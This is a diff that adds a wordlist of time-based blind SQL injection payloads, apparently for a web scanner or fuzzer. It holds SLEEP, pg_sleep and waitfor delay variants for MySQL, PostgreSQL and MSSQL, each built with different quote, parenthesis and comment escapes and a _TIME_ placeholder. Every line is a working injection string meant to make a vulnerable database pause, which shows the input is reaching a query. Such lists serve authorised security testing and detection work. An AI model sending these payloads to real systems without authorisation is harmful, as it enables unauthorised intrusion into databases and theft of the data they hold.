@@ -1,1 +1,72 @@
+sleep(_TIME_)
+sleep(_TIME_)#
+1 or sleep(_TIME_)#
+" or sleep(_TIME_)#
+' or sleep(_TIME_)#
+" or sleep(_TIME_)="
+' or sleep(_TIME_)='
+1) or sleep(_TIME_)#
+") or sleep(_TIME_)="
+') or sleep(_TIME_)='
+1)) or sleep(_TIME_)#
+")) or sleep(_TIME_)="
+')) or sleep(_TIME_)='
 1'AnD SLEEP(_TIME_)='
+;waitfor delay '0:0:_TIME_'--
+);waitfor delay '0:0:_TIME_'--
+';waitfor delay '0:0:_TIME_'--
+";waitfor delay '0:0:_TIME_'--
+');waitfor delay '0:0:_TIME_'--
+");waitfor delay '0:0:_TIME_'--
+));waitfor delay '0:0:_TIME_'--
+'));waitfor delay '0:0:_TIME_'--
+"));waitfor delay '0:0:_TIME_'--
+pg_sleep(_TIME_)--
+1 or pg_sleep(_TIME_)--
+" or pg_sleep(_TIME_)--
+' or pg_sleep(_TIME_)--
+1) or pg_sleep(_TIME_)--
+") or pg_sleep(_TIME_)--
+') or pg_sleep(_TIME_)--
+1)) or pg_sleep(_TIME_)--
+")) or pg_sleep(_TIME_)--
+')) or pg_sleep(_TIME_)--
+AND (SELECT * FROM (SELECT(SLEEP(_TIME_)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(_TIME_)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(_TIME_)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(_TIME_)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(_TIME_)))nQIP)#
+SLEEP(_TIME_)#
+SLEEP(_TIME_)--
+SLEEP(_TIME_)="
+SLEEP(_TIME_)='
+or SLEEP(_TIME_)
+or SLEEP(_TIME_)#
+or SLEEP(_TIME_)--
+or SLEEP(_TIME_)="
+or SLEEP(_TIME_)='
+waitfor delay '00:00:_TIME_'
+waitfor delay '00:00:_TIME_'--
+waitfor delay '00:00:_TIME_'#
+pg_SLEEP(_TIME_)
+pg_SLEEP(_TIME_)--
+pg_SLEEP(_TIME_)#
+or pg_SLEEP(_TIME_)
+or pg_SLEEP(_TIME_)--
+or pg_SLEEP(_TIME_)#
+'\"
+AnD SLEEP(_TIME_)
+AnD SLEEP(_TIME_)--
+AnD SLEEP(_TIME_)#
+&&SLEEP(_TIME_)
+&&SLEEP(_TIME_)--
+&&SLEEP(_TIME_)#
+' AnD SLEEP(_TIME_) ANd '1
+'&&SLEEP(_TIME_)&&'1
+ORDER BY SLEEP(_TIME_)
+ORDER BY SLEEP(_TIME_)--
+ORDER BY SLEEP(_TIME_)#
+(SELECT * FROM (SELECT(SLEEP(_TIME_)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(_TIME_)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(_TIME_)))ecMj)--
++ SLEEP(_TIME_) + '
